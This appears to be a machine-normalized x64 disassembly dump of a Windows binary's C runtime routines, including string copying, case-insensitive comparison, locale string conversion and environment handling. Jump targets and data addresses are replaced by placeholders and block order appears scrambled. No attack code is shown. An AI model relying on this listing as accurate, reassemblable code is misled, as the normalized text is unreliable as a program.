call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
lea rdx [ r--data ]
mov rcx rsi
mov [ rw-data ] rax
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
mov r11 rax
mov [ rw-data ] rax
test rax rax
je r-xdata
mov r9d ebp
mov r8 r14
mov rdx r13
mov rcx rbx
call rax
jmp r-xdata
call rax
mov rbx rax
test rax rax
je r-xdata
test rax rax
je r-xdata
mov rax [ rw-data ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx rsi
call [ GetProcAddress@IAT ]
mov rcx rax
call [ EncodePointer@IAT ]
mov [ rw-data ] rax
jmp r-xdata
mov rcx [ rsp + 0x48 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x50
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
mov rcx [ rw-data ]
cmp rcx rdi
je r-xdata
call rsi
test rax rax
je r-xdata
cmp rax rdi
je r-xdata
mov r11 [ rw-data ]
call [ DecodePointer@IAT ]
test rax rax
je r-xdata
bts ebp 0x15
jmp r-xdata
lea rcx [ rsp + 0x30 ]
mov r9d 0xc
lea r8 [ rsp + 0x38 ]
mov [ rsp + 0x20 ] rcx
lea edx [ r9 - 0xb ]
mov rcx rax
call r12
test eax eax
je r-xdata
mov rcx rbx
call rax
mov rbx rax
test [ rsp + 0x40 ] 0x1
jne r-xdata
sub_140051330
push rbx
sub rsp 0x20
xor r10d r10d
mov r9 rcx
test rcx rcx
je r-xdata
call sub_14003f1a4
mov ebx 0x16
test rdx rdx
je r-xdata
test r8 r8
jne r-xdata
cmp [ rcx ] r10w
je r-xdata
mov [ rcx ] r10w
test rdx rdx
jne r-xdata
add rcx 0x2
dec rdx
jne r-xdata
sub rcx r8
mov [ r9 ] r10w
jmp r-xdata
test rdx rdx
jne r-xdata
dec rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov [ r9 ] r10w
call sub_14003f1a4
mov ebx 0x22
jmp r-xdata
movzx eax [ r8 ]
mov [ rcx + r8 ] ax
add r8 0x2
test ax ax
je r-xdata
add rsp 0x20
pop rbx
retn
mov [ rax ] ebx
call sub_140043760
mov eax ebx
sub_1400513b8
push rbx
sub rsp 0x20
xor ebx ebx
mov r10 r8
test r9 r9
jne r-xdata
test rcx rcx
je r-xdata
test rcx rcx
jne r-xdata
call sub_14003f1a4
mov ebx 0x16
test rdx rdx
je r-xdata
test rdx rdx
jne r-xdata
test r9 r9
jne r-xdata
xor eax eax
jmp r-xdata
test r8 r8
jne r-xdata
mov [ rcx ] bx
jmp r-xdata
add rsp 0x20
pop rbx
retn
mov r11 rcx
mov r8 rdx
cmp r9 0xffffffffffffffff
jne r-xdata
mov [ rcx ] bx
sub r10 rcx
sub r11 r10
test r9 r9
jne r-xdata
dec r8
je r-xdata
test r8 r8
jne r-xdata
dec r8
jne r-xdata
mov [ r11 ] bx
dec r9
jne r-xdata
cmp r9 0xffffffffffffffff
jne r-xdata
movzx eax [ r10 ]
mov [ r11 + r10 ] ax
add r10 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx eax [ r10 + r11 ]
mov [ r11 ] ax
add r11 0x2
test ax ax
je r-xdata
mov [ rcx ] bx
call sub_14003f1a4
mov ebx 0x22
jmp r-xdata
mov [ rcx + rdx * 2 - 0x2 ] bx
lea eax [ r8 + 0x50 ]
jmp r-xdata
mov [ rax ] ebx
call sub_140043760
mov eax ebx
sub_140051488
sub rsp 0x28
test ecx ecx
js r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
or eax 0xffffffff
cmp ecx 0x2
jle r-xdata
mov eax [ rw-data ]
mov [ rw-data ] ecx
jmp r-xdata
cmp ecx 0x3
jne r-xdata
add rsp 0x28
retn
mov eax [ rw-data ]
jmp r-xdata
sub_1400514c8
sub rsp 0x28
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
jmp r-xdata
call sub_14003f1a4
mov [ rax ] 0x9
call sub_140043760
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
movsxd rcx ecx
lea rdx [ rw-data ]
mov rax rcx
and ecx 0x1f
sar rax 0x5
imul rcx rcx 0x58
mov rax [ rdx + rax * 8 ]
movsx eax [ rax + rcx + 0x8 ]
and eax 0x40
jmp r-xdata
add rsp 0x28
retn
sub_140051540
mov [ rsp + 0x8 ] cx
push rbx
sub rsp 0x20
mov eax 0xffff
movzx ebx dx
cmp cx ax
jne r-xdata
mov eax 0x100
cmp cx ax
jae r-xdata
xor eax eax
jmp r-xdata
mov ecx 0x1
lea r9 [ rsp + 0x40 ]
lea rdx [ rsp + 0x30 ]
mov r8d ecx
call [ GetStringTypeW@IAT ]
xor ecx ecx
test eax eax
je r-xdata
mov rax [ rw-data ]
movzx ecx cx
movzx eax [ rax + rcx * 2 ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
movzx eax cx
movzx ecx [ rsp + 0x40 ]
movzx ecx bx
and eax ecx
sub_1400515a8
mov r9 rcx
movzx ecx [ rdx ]
inc rdx
lea eax [ rcx - 0x41 ]
cmp eax 0x19
ja r-xdata
add r8d 0x20
test r8d r8d
je r-xdata
add ecx 0x20
sub r8d ecx
mov eax r8d
retn
cmp r8d ecx
je r-xdata
movzx r8d [ r9 ]
inc r9
lea eax [ r8 - 0x41 ]
cmp eax 0x19
ja r-xdata
sub_1400515e4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
mov rbp rsp
sub rsp 0x40
mov rsi rcx
mov rdi rdx
lea rcx [ rbp - 0x20 ]
mov rdx r8
call sub_14003b928
test rsi rsi
jne r-xdata
test rdi rdi
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov rax [ rbp - 0x20 ]
cmp [ rax + 0x14 ] 0x0
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
sub rsi rdi
mov rdx rdi
mov rcx rsi
call sub_1400515a8
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x40
pop rbp
retn
sub ebx eax
cmp [ rbp - 0x8 ] 0x0
je r-xdata
cmp ebx eax
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
mov eax ebx
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
movzx ecx [ rsi + rdi ]
lea rdx [ rbp - 0x20 ]
call sub_140042940
movzx ecx [ rdi ]
lea rdx [ rbp - 0x20 ]
mov ebx eax
call sub_140042940
inc rdi
test ebx ebx
je r-xdata
sub_1400516bc
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor r8d r8d
add rsp 0x28
jmp sub_1400515e4
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
mov eax 0x7fffffff
add rsp 0x28
retn
add rsp 0x28
jmp sub_1400515a8
sub_140051710
mov r10 rcx
test r8 r8
je r-xdata
xor eax eax
retn
movzx r9d [ r10 ]
inc r10
lea eax [ r9 - 0x41 ]
cmp eax 0x19
ja r-xdata
movzx ecx [ rdx ]
inc rdx
lea eax [ rcx - 0x41 ]
cmp eax 0x19
ja r-xdata
add r9d 0x20
dec r8
je r-xdata
add ecx 0x20
sub r9d ecx
mov eax r9d
retn
test r9d r9d
je r-xdata
cmp r9d ecx
je r-xdata
sub_140051758
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
push rbp
mov rbp rsp
sub rsp 0x40
mov r12 r8
mov rsi rdx
mov rdi rcx
test r8 r8
je r-xdata
xor eax eax
lea rcx [ rbp - 0x20 ]
mov rdx r9
call sub_14003b928
test rdi rdi
jne r-xdata
test rsi rsi
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
cmp [ rbp - 0x8 ] 0x0
je r-xdata
cmp r12 0x7fffffff
ja r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rax [ rbp - 0x20 ]
cmp [ rax + 0x14 ] 0x0
jne r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
mov r12 [ rsp + 0x68 ]
add rsp 0x40
pop rbp
retn
sub rdi rsi
mov r8 r12
mov rdx rsi
mov rcx rdi
call sub_140051710
cmp [ rbp - 0x8 ] 0x0
je r-xdata
sub ebx eax
cmp [ rbp - 0x8 ] 0x0
je r-xdata
test ebx ebx
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
jmp r-xdata
mov eax ebx
jmp r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp ebx eax
je r-xdata
movzx ecx [ rdi + rsi ]
lea rdx [ rbp - 0x20 ]
call sub_140042940
movzx ecx [ rsi ]
lea rdx [ rbp - 0x20 ]
mov ebx eax
call sub_140042940
inc rsi
dec r12
je r-xdata
sub_14005185c
sub rsp 0x28
cmp [ rw-data ] 0x0
jne r-xdata
xor r9d r9d
add rsp 0x28
jmp sub_140051758
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
mov eax 0x7fffffff
add rsp 0x28
retn
cmp r8 0x7fffffff
ja r-xdata
add rsp 0x28
jmp sub_140051710
sub_1400518ac
mov edx 0x30
cmp cx dx
jb r-xdata
or eax 0xffffffff
retn
cmp cx 0x3a
jae r-xdata
mov edx 0xff10
cmp cx dx
jae r-xdata
movzx eax cx
sub eax edx
retn
mov eax 0xff1a
mov edx 0x660
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
mov edx 0x6f0
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
mov edx 0x966
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ rax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ rax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ rax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ rax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
mov edx 0xc66
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ rax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ rax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
mov edx 0xe50
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ rax + 0x76 ]
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ rax + 0x46 ]
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
mov edx 0x1040
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
mov edx 0x17e0
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
cmp cx ax
jb r-xdata
lea edx [ rax + 0x26 ]
cmp cx dx
jb r-xdata
lea eax [ rdx + 0xa ]
jmp r-xdata
cmp cx ax
jb r-xdata
sub_140051ab0
mov r9 rcx
xor r8d r8d
mov al [ rcx ]
inc rcx
test al al
jne r-xdata
dec rcx
cmp rcx r9
je r-xdata
cmp [ rcx ] dl
cmove r8 rcx
mov rax r8
retn
cmp [ rcx ] dl
jne r-xdata
sub_140051ad8
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rdi
push rbp
mov rbp rsp
sub rsp 0x80
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x8 ] rax
mov rdi rcx
mov rbx rdx
lea rcx [ rbp - 0x40 ]
mov rdx r8
call sub_14003b928
lea r11 [ rbp - 0x40 ]
lea rdx [ rbp - 0x20 ]
mov [ rsp + 0x38 ] r11
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
lea rcx [ rbp - 0x18 ]
xor r9d r9d
mov r8 rbx
call sub_14005415c
lea rcx [ rbp - 0x18 ]
mov rdx rdi
mov ebx eax
call sub_1400535c4
mov edx 0x3
test dl bl
jne r-xdata
test bl 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
test bl 0x2
je r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
mov eax 0x4
jmp r-xdata
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x28 ] 0x0
je r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
mov eax edx
jmp r-xdata
mov rcx [ rbp - 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rcx [ rbp - 0x8 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x80 ]
mov rbx [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
xor eax eax
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_140051bd8
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rdi
push rbp
mov rbp rsp
sub rsp 0x80
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x8 ] rax
mov rdi rcx
mov rbx rdx
lea rcx [ rbp - 0x40 ]
mov rdx r8
call sub_14003b928
lea r11 [ rbp - 0x40 ]
lea rdx [ rbp - 0x20 ]
mov [ rsp + 0x38 ] r11
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
lea rcx [ rbp - 0x18 ]
xor r9d r9d
mov r8 rbx
call sub_14005415c
lea rcx [ rbp - 0x18 ]
mov rdx rdi
mov ebx eax
call sub_140053b90
mov edx 0x3
test dl bl
jne r-xdata
test bl 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
test bl 0x2
je r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
mov eax 0x4
jmp r-xdata
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x28 ] 0x0
je r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
mov eax edx
jmp r-xdata
mov rcx [ rbp - 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rcx [ rbp - 0x8 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x80 ]
mov rbx [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
xor eax eax
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_140051cd8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov r10 [ r9 + 0x10 ]
xor r11d r11d
mov rbx rcx
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_14003f1a4
mov ebx 0x16
mov eax r11d
test r8d r8d
mov [ rcx ] r11b
cmovg eax r8d
inc eax
cdqe
cmp rdx rax
ja r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rcx ] 0x30
lea rax [ rcx + 0x1 ]
jmp r-xdata
call sub_14003f1a4
mov ebx 0x22
jmp r-xdata
test r8d r8d
jg r-xdata
mov [ rax ] ebx
call sub_140043760
mov eax ebx
jmp r-xdata
cmp [ r10 ] r11b
je r-xdata
mov [ rax ] r11b
js r-xdata
mov ecx 0x30
movsx ecx [ r10 ]
inc r10
jmp r-xdata
cmp [ rbx ] 0x31
jne r-xdata
cmp [ r10 ] 0x35
jl r-xdata
mov [ rax ] cl
inc rax
dec r8d
lea rcx [ rbx + 0x1 ]
call sub_14003f7f0
lea rdx [ rbx + 0x1 ]
mov rcx rbx
lea r8 [ rax + 0x1 ]
call sub_14003a8c0
inc [ r9 + 0x4 ]
jmp r-xdata
jmp r-xdata
xor eax eax
dec rax
cmp [ rax ] 0x39
je r-xdata
mov [ rax ] 0x30
inc [ rax ]
sub_140051da4
mov [ rsp + 0x8 ] rbx
movzx r11d [ rdx + 0x6 ]
mov r9 rcx
mov ecx [ rdx + 0x4 ]
movzx r8d r11w
mov eax 0x8000
mov r10d 0x7ff
shr r8w 0x4
and r11w ax
mov eax [ rdx ]
and r8w r10w
and ecx 0xfffff
mov ebx 0x80000000
movzx edx r8w
test edx edx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx r10d
je r-xdata
mov edx 0x3c01
add r8w dx
xor ebx ebx
test eax eax
jne r-xdata
mov r8d 0x7fff
jmp r-xdata
mov edx 0x3c00
add r8w dx
jmp r-xdata
mov [ r9 + 0x4 ] r10d
test r10d r10d
jns r-xdata
and [ r9 + 0x4 ] eax
and [ r9 ] eax
jmp r-xdata
mov r10d eax
shl ecx 0xb
shr r10d 0x15
or r10d ecx
or r10d ebx
shl eax 0xb
mov [ r9 ] eax
jmp r-xdata
mov edx [ r9 ]
lea eax [ r10 + r10 ]
mov ecx edx
shr ecx 0x1f
mov r10d ecx
or r10d eax
lea eax [ rdx + rdx ]
mov [ r9 ] eax
mov eax 0xffff
add r8w ax
or r11w r8w
mov rbx [ rsp + 0x8 ]
mov [ r9 + 0x8 ] r11w
retn
sub_140051e6c
push rbp
push rbx
push rsi
push rdi
lea rbp [ rsp - 0x3f ]
sub rsp 0x88
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x27 ] rax
mov rdi rdx
mov [ rbp - 0x19 ] rcx
lea rdx [ rbp - 0x19 ]
lea rcx [ rbp - 0x9 ]
mov rbx r9
mov rsi r8
call sub_140051da4
mov rax [ rbp - 0x9 ]
xor r8d r8d
mov [ rbp - 0x19 ] rax
movzx eax [ rbp - 0x1 ]
lea r9 [ rbp + 0x7 ]
lea edx [ r8 + 0x11 ]
lea rcx [ rbp - 0x19 ]
mov [ rbp - 0x11 ] ax
call sub_140054b58
movsx ecx [ rbp + 0x9 ]
lea r8 [ rbp + 0xb ]
mov [ rdi ] ecx
movsx ecx [ rbp + 0x7 ]
mov rdx rbx
mov [ rdi + 0x4 ] ecx
mov rcx rsi
mov [ rdi + 0x8 ] eax
call sub_140042dcc
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_1400436bc
int3
mov [ rdi + 0x10 ] rsi
mov rax rdi
mov rcx [ rbp + 0x27 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x88
pop rdi
pop rsi
pop rbx
pop rbp
retn
sub_140051f30
push rbp
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x68
lea rbp [ rsp + 0x30 ]
mov rax [ rw-data ]
xor rax rbp
mov [ rbp + 0x28 ] rax
mov edi [ rbp + 0xa0 ]
mov r12 [ rbp + 0xa8 ]
xor ebx ebx
mov [ rbp + 0x4 ] r8d
mov r13 r9
mov [ rbp ] edx
mov r8 rcx
mov [ rbp + 0x8 ] r12
mov r15d 0x1
test edi edi
jle r-xdata
or ecx 0xffffffff
cmp edi ecx
jge r-xdata
mov edx edi
mov rax r9
mov esi [ rbp + 0xb0 ]
test esi esi
jle r-xdata
xor eax eax
jmp r-xdata
mov eax ecx
sub eax edx
add edi eax
add rax r15
test edx edx
jne r-xdata
cmp esi ecx
jl r-xdata
mov eax esi
mov rdx r12
mov rcx [ rbp + 0x28 ]
xor rcx rbp
call sub_14003a6a0
lea rsp [ rbp + 0x38 ]
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
pop rbp
retn
sub edx r15d
or ecx 0xffffffff
cmp [ rax ] bl
je r-xdata
mov edx ecx
mov r14d [ rbp + 0xb8 ]
test r14d r14d
jne r-xdata
sub ecx eax
add esi ecx
jmp r-xdata
add rdx r15
test eax eax
jne r-xdata
test edi edi
je r-xdata
mov rax [ r8 ]
mov r14d [ rax + 0x4 ]
sub eax r15d
cmp [ rdx ] bl
je r-xdata
mov eax ecx
cmp edi esi
jne r-xdata
test esi esi
jne r-xdata
cmp esi r15d
jle r-xdata
mov eax 0x2
jmp r-xdata
mov r9d edi
mov r8 r13
mov edx 0x9
mov ecx r14d
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
movsxd r15 eax
test eax eax
je r-xdata
cmp edi r15d
jle r-xdata
mov eax r15d
jmp r-xdata
mov r8 0xffffffffffffff0
jle r-xdata
lea rdx [ rbp + 0x10 ]
mov ecx r14d
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax 0x3
jmp r-xdata
mov r12 rbx
xor edx edx
lea rax [ rdx - 0x20 ]
div r15
cmp rax 0x2
jb r-xdata
test edi edi
jle r-xdata
mov r9d edi
mov r8 r13
mov edx 0x1
mov ecx r14d
mov [ rsp + 0x28 ] r15d
mov [ rsp + 0x20 ] r12
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea rcx [ r15 + r15 + 0x10 ]
cmp rcx 0x400
ja r-xdata
test esi esi
jle r-xdata
cmp [ rbp + 0x10 ] 0x2
jb r-xdata
lea rcx [ r12 - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov r8 [ rbp + 0x8 ]
mov r9d esi
mov edx 0x9
mov ecx r14d
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
movsxd r13 eax
test eax eax
je r-xdata
call sub_14003ae78
mov r12 rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
cmp [ rbp + 0x10 ] 0x2
jb r-xdata
cmp [ rbp + 0x16 ] bl
lea rax [ rbp + 0x16 ]
mov eax ebx
call sub_14003ad04
jle r-xdata
test r12 r12
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_14003d700
sub rsp rax
lea r12 [ rsp + 0x30 ]
test r12 r12
je r-xdata
mov rax r8
cmp [ rbp + 0x16 ] bl
lea rax [ rbp + 0x16 ]
cmp [ rax + 0x1 ] bl
je r-xdata
mov rdi rbx
xor edx edx
lea rax [ rdx - 0x20 ]
div r13
cmp rax 0x2
jb r-xdata
mov [ r12 ] 0xcccc
jmp r-xdata
cmp [ rax + 0x1 ] bl
je r-xdata
mov cl [ r13 ]
cmp cl [ rax ]
jb r-xdata
mov r8 [ rbp + 0x8 ]
mov r9d esi
mov edx 0x1
mov ecx r14d
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] rdi
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
lea rcx [ r13 + r13 + 0x10 ]
cmp rcx 0x400
ja r-xdata
add r12 0x10
jmp r-xdata
mov cl [ r12 ]
cmp cl [ rax ]
jb r-xdata
add rax 0x2
cmp [ rax ] bl
jmp r-xdata
cmp cl [ rax + 0x1 ]
jbe r-xdata
lea rcx [ rdi - 0x10 ]
cmp [ rcx ] 0xdddd
jne r-xdata
mov edx [ rbp + 0x4 ]
mov ecx [ rbp ]
mov r9d r15d
mov r8 r12
mov [ rsp + 0x28 ] r13d
mov [ rsp + 0x20 ] rdi
call [ CompareStringW@IAT ]
mov ebx eax
call sub_14003ae78
mov rdi rax
test rax rax
je r-xdata
lea rax [ rcx + 0xf ]
cmp rax rcx
ja r-xdata
add rax 0x2
cmp [ rax ] bl
jmp r-xdata
cmp cl [ rax + 0x1 ]
jbe r-xdata
je r-xdata
call sub_14003ad04
test rdi rdi
je r-xdata
mov [ rax ] 0xdddd
and rax 0xfffffffffffffff0
call sub_14003d700
sub rsp rax
lea rdi [ rsp + 0x30 ]
test rdi rdi
je r-xdata
mov rax 0xffffffffffffff0
je r-xdata
mov [ rdi ] 0xcccc
jmp r-xdata
add rdi 0x10
jmp r-xdata
sub_140052274
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x60
mov esi edx
mov rdx rcx
lea rcx [ rsp + 0x40 ]
mov rbx r9
mov edi r8d
call sub_14003b928
mov r11d [ rsp + 0xa8 ]
mov eax [ rsp + 0xa0 ]
lea rcx [ rsp + 0x40 ]
mov [ rsp + 0x38 ] r11d
mov [ rsp + 0x30 ] eax
mov rax [ rsp + 0x98 ]
mov [ rsp + 0x28 ] rax
mov eax [ rsp + 0x90 ]
mov r9 rbx
mov r8d edi
mov edx esi
mov [ rsp + 0x20 ] eax
call sub_140051f30
cmp [ rsp + 0x58 ] 0x0
je r-xdata
mov rbx [ rsp + 0x70 ]
mov rsi [ rsp + 0x78 ]
add rsp 0x60
pop rdi
retn
mov rcx [ rsp + 0x50 ]
and [ rcx + 0xc8 ] 0xfffffffd
sub_140052300
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push rbp
mov rbp rsp
sub rsp 0x60
mov rsi rcx
mov rdi rdx
lea rcx [ rbp - 0x20 ]
mov rdx r9
mov rbx r8
call sub_14003b928
test rbx rbx
jne r-xdata
test rsi rsi
jne r-xdata
cmp [ rbp - 0x8 ] bl
je r-xdata
test rdi rdi
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
xor eax eax
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp rbx 0x7fffffff
ja r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rbp - 0x10 ]
and [ rax + 0xc8 ] 0xfffffffd
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x10 ]
mov rsi [ r11 + 0x18 ]
mov rdi [ r11 + 0x20 ]
mov rsp r11
pop rbp
retn
mov rax [ rbp - 0x20 ]
mov edx [ rax + 0x10 ]
test edx edx
jne r-xdata
mov eax [ rax + 0x8 ]
lea rcx [ rbp - 0x20 ]
mov r9 rsi
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x30 ] ebx
mov r8d 0x1001
mov [ rsp + 0x28 ] rdi
mov [ rsp + 0x20 ] ebx
call sub_140052274
test eax eax
jne r-xdata
lea r9 [ rbp - 0x20 ]
mov r8 rbx
mov rdx rdi
mov rcx rsi
call sub_140051758
jmp r-xdata
add eax 0xfffffffe
call sub_14003f1a4
mov [ rax ] 0x16
jmp r-xdata
cmp [ rbp - 0x8 ] 0x0
je r-xdata
mov rcx [ rbp - 0x10 ]
and [ rcx + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x8 ] 0x0
je r-xdata
sub_140052404
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x10 ] edx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
xor r13d r13d
mov ebp edx
mov r14 rcx
mov ebx r13d
test rcx rcx
jne r-xdata
mov r12 [ rcx ]
test r12 r12
je r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
call sub_140043760
jmp r-xdata
call sub_14003f1a4
mov [ rax ] 0x16
mov edx 0x3d
mov rcx r12
call sub_140055760
mov rdi rax
mov [ rsp + 0x70 ] rax
test rax rax
je r-xdata
or eax 0xffffffff
cmp r12 rax
je r-xdata
cmp [ rax + 0x1 ] r13b
mov rsi [ rw-data ]
mov r15d r13d
sete r15b
cmp rsi [ rw-data ]
jne r-xdata
test rsi rsi
jne r-xdata
mov rbp rsi
mov eax r13d
test rsi rsi
jne r-xdata
mov rbp rsi
test rsi rsi
je r-xdata
test ebp ebp
je r-xdata
cmp [ rsi ] r13
jne r-xdata
mov rsi r13
jmp r-xdata
mov rcx [ rsi ]
mov eax edi
mov rdi rsi
sub eax r12d
movsxd r13 eax
test rcx rcx
je r-xdata
test r15d r15d
je r-xdata
cmp [ rw-data ] r13
je r-xdata
add rsi 0x8
inc eax
inc eax
mov edx 0x8
movsxd rcx eax
call sub_140041704
mov rdi rax
mov rsi rax
test rax rax
jne r-xdata
mov ebp [ rsp + 0x78 ]
mov [ rw-data ] rsi
sub rdi rsi
sar rdi 0x3
neg edi
mov rdx rcx
mov r8 r13
mov rcx r12
call sub_14004ce70
test eax eax
jne r-xdata
mov ecx 0x8
call sub_140041684
mov [ rw-data ] rax
test rax rax
je r-xdata
xor eax eax
jmp r-xdata
call sub_14004ce78
test eax eax
je r-xdata
